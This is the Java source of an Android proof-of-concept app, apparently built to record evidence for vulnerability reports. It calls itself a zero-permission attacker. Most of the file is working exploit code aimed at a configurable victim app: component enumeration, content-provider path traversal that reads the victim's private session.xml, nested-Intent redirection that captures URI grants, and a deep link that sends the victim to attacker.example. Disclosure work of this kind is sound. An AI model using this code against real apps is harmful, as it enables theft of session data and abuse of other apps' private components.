package com.sanehunters.probe;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ProviderInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.text.method.ScrollingMovementMethod;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;

/**
 * probe — the zero-permission attacker app.
 *
 * WHY THIS EXISTS
 *   `adb shell am start` runs as the SHELL uid, which holds far more privilege than any real
 *   attacker. A finding proved only by adb has NOT established AM-03. Everything here runs as an
 *   ordinary third-party app declaring no permissions at all.
 *
 * HOW TO USE IT
 *   1. Set VICTIM and the targets below.
 *   2. ./gradlew :app:assembleDebug && adb install -r app/build/outputs/apk/debug/app-debug.apk
 *   3. Record per docs/04-poc-and-evidence-standard.md. The log pane IS the narration — no
 *      voiceover, no captions.
 *
 * THE LOG PANE CONTRACT
 *   - print the RAW platform return value, with its meaning in parentheses. Never paraphrase.
 *   - state what the app CANNOT do before the exploit (Beat 4, the negative control).
 *   - finish with one line naming the impact.
 */
public class MainActivity extends Activity {

    // ── CONFIGURE ─────────────────────────────────────────────────────────────
    static final String VICTIM   = "com.victim.app";
    static final String FINDING  = "F-001";
    static final String CLASS    = "exported provider -> arbitrary file read";
    static final String PRECOND  = "no permissions · targetSdk 35";

    static final String PROXY      = VICTIM + ".ProxyActivity";          // exported router
    static final String NONEXPORT  = VICTIM + ".InternalAuthActivity";   // non-exported target
    static final String AUTHORITY  = VICTIM + ".fileprovider";
    static final String TRAVERSAL  = "content://" + AUTHORITY + "/root/data/data/" + VICTIM
                                   + "/shared_prefs/session.xml";
    static final String DEEPLINK   = "victimapp://open?url=https://attacker.example/";
    // ──────────────────────────────────────────────────────────────────────────

    TextView log; ScrollView scroll;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);
        log = findViewById(R.id.log);
        scroll = findViewById(R.id.scroll);
        log.setMovementMethod(new ScrollingMovementMethod());

        ((TextView) findViewById(R.id.header)).setText(
                FINDING + " — " + CLASS + "\n" + PRECOND);

        LinearLayout bar = findViewById(R.id.buttons);
        btn(bar, "0) BASELINE — what I am NOT allowed to do", v -> baseline());
        btn(bar, "1) ENUMERATE victim surface",               v -> enumerate());
        btn(bar, "2) PROVIDER — query / call / openFile",     v -> providers());
        btn(bar, "3) EXPLOIT — read the protected file",      v -> readUri(TRAVERSAL));
        btn(bar, "4) INTENT REDIRECTION via exported proxy",  v -> redirect());
        btn(bar, "5) DEEP LINK as a web page would fire it",  v -> deeplink());

        p("== probe ready ==");
        p("This app declares ZERO permissions. Check its manifest.");
        p("Tap 0 first: the negative control belongs in the SAME take as the exploit.");
    }

    // ── BEAT 4: the negative control, stated by the app itself ───────────────
    void baseline() {
        p("\n== BASELINE — the access I hold before any exploit ==");
        try {
            int r = checkCallingOrSelfUriPermission(Uri.parse(TRAVERSAL),
                    Intent.FLAG_GRANT_READ_URI_PERMISSION);
            p("checkUriPermission(target) -> " + r
              + "  (0 = GRANTED, -1 = DENIED)");
        } catch (Throwable t) { p("checkUriPermission threw: " + t); }
        p("declared permissions: NONE");
        p("Direct read attempt, expected to fail:");
        readUri(TRAVERSAL);
        p("-- if the line above is a SecurityException, the control is working --");
    }

    // ── Surface enumeration, from an unprivileged uid ────────────────────────
    void enumerate() {
        p("\n== victim surface visible to a zero-permission app ==");
        PackageManager pm = getPackageManager();
        try {
            android.content.pm.PackageInfo pi = pm.getPackageInfo(VICTIM,
                    PackageManager.GET_ACTIVITIES | PackageManager.GET_PROVIDERS
                  | PackageManager.GET_RECEIVERS  | PackageManager.GET_SERVICES);
            p("versionName=" + pi.versionName + " versionCode=" + pi.versionCode);
            if (pi.activities != null) for (android.content.pm.ActivityInfo a : pi.activities)
                if (a.exported) p("  [activity] " + a.name
                        + (a.permission != null ? "  perm=" + a.permission : "  NO PERMISSION"));
            if (pi.providers != null) for (ProviderInfo x : pi.providers)
                if (x.exported) p("  [provider] " + x.authority
                        + "  r=" + x.readPermission + " w=" + x.writePermission
                        + " grantUri=" + x.grantUriPermissions);
            if (pi.receivers != null) for (android.content.pm.ActivityInfo a : pi.receivers)
                if (a.exported) p("  [receiver] " + a.name
                        + (a.permission != null ? "  perm=" + a.permission : "  NO PERMISSION"));
            if (pi.services != null) for (android.content.pm.ServiceInfo s : pi.services)
                if (s.exported) p("  [service]  " + s.name
                        + (s.permission != null ? "  perm=" + s.permission : "  NO PERMISSION"));
        } catch (Throwable t) {
            p("getPackageInfo failed: " + t);
            p("NOTE: on API 30+ you must declare <queries> for the victim, or this returns nothing.");
            p("      That absence is a package-visibility artefact, NOT a negative result.");
        }
    }

    // ── D07: read / write / call are three separate questions ────────────────
    void providers() {
        p("\n== provider: read, write and call() tested SEPARATELY ==");
        p("   (call() is gated by neither readPermission nor writePermission)");
        for (String path : new String[]{"", "/", "/1", "/..", "/..%2f..%2fshared_prefs"}) {
            Uri u = Uri.parse("content://" + AUTHORITY + path);
            try (Cursor c = getContentResolver().query(u, null, null, null, null)) {
                p("  query " + u + " -> " + (c == null ? "null cursor" : c.getCount() + " rows **READABLE**"));
            } catch (Throwable t) { p("  query " + u + " -> " + t.getClass().getSimpleName()); }
        }
        for (String m : new String[]{"test", "getInfo", "get", "init"}) {
            try {
                Bundle r = getContentResolver().call(Uri.parse("content://" + AUTHORITY), m, null, null);
                if (r != null) p("  call(" + m + ") -> **RETURNED** " + r.keySet());
            } catch (Throwable t) { /* closed */ }
        }
    }

    // ── The read primitive ───────────────────────────────────────────────────
    void readUri(String uri) {
        ContentResolver cr = getContentResolver();
        try (InputStream in = cr.openInputStream(Uri.parse(uri))) {
            if (in == null) { p("  openInputStream -> null"); return; }
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            byte[] buf = new byte[4096]; int n, total = 0;
            while ((n = in.read(buf)) > 0 && total < 8192) { bo.write(buf, 0, n); total += n; }
            String s = bo.toString();
            p("  ** READ " + total + " bytes from " + uri + " **");
            p(s.length() > 1200 ? s.substring(0, 1200) + "\n  ...(truncated)" : s);
            p("== done — the above was read with NO permissions declared ==");
        } catch (Throwable t) {
            p("  openInputStream(" + uri + ") -> " + t.getClass().getSimpleName()
              + ": " + String.valueOf(t.getMessage()));
        }
    }

    // ── D08: nested-Intent redirection + URI grant capture ───────────────────
    void redirect() {
        p("\n== intent redirection through the exported proxy ==");
        Intent inner = new Intent();
        inner.setClassName(VICTIM, NONEXPORT);          // a NON-exported component
        inner.setData(Uri.parse("content://" + AUTHORITY + "/"));
        inner.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
                     | Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                     | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION
                     | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION);

        Intent outer = new Intent();
        outer.setClassName(VICTIM, PROXY);              // the exported router
        // Try the common extra keys; read the victim's code for the real one.
        outer.putExtra("intent", inner);
        outer.putExtra("extra_intent", inner);
        outer.putExtra("forward_intent", inner);
        outer.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        p("  inner  -> " + NONEXPORT + "  with all four FLAG_GRANT_* set");
        p("  outer  -> " + PROXY);
        try { startActivity(outer); p("  sent. Watch LootActivity for a captured grant."); }
        catch (Throwable t) { p("  startActivity failed: " + t); }
    }

    // ── D09: fire the deep link exactly as a web page would ──────────────────
    void deeplink() {
        p("\n== deep link, as a BROWSABLE VIEW intent (what a web page can do) ==");
        Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(DEEPLINK));
        i.addCategory(Intent.CATEGORY_BROWSABLE);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        p("  " + DEEPLINK);
        try { startActivity(i); p("  sent — check where it landed:"); }
        catch (Throwable t) { p("  no handler / failed: " + t); }
        p("  adb shell dumpsys activity activities | grep -m1 topResumedActivity");
    }

    // ── plumbing ─────────────────────────────────────────────────────────────
    void btn(LinearLayout bar, String label, View.OnClickListener l) {
        Button b = new Button(this); b.setText(label); b.setAllCaps(false);
        b.setTextSize(11); b.setOnClickListener(l); bar.addView(b);
    }
    void p(final String s) {
        runOnUiThread(() -> {
            log.append(s + "\n");
            scroll.post(() -> scroll.fullScroll(View.FOCUS_DOWN));
        });
    }
}
